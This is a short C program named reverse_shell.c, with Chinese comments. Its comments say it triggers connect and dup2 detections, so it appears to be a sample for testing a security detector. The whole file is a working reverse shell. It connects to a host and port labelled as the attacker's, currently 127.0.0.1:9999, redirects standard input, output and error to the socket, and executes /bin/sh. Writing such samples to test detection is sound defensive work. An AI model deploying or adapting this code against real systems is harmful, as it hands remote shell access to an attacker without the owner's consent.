// reverse_shell.c
#include <sys/socket.h>
#include <netinet/in.h>
#include <unistd.h>
#include <arpa/inet.h>

int main() {
    int sock = socket(AF_INET, SOCK_STREAM, 0);
    struct sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_port = htons(9999); // 攻击者端口
    addr.sin_addr.s_addr = inet_addr("127.0.0.1"); // 攻击者 IP

    // 触发 CONNECT 检测
    connect(sock, (struct sockaddr*)&addr, sizeof(addr));

    // 触发 DUP2 检测
    dup2(sock, 0); // stdin
    dup2(sock, 1); // stdout
    dup2(sock, 2); // stderr

    // 执行一个 shell，其 I/O 已被重定向到 socket
    execve("/bin/sh", NULL, NULL);
    return 0;
}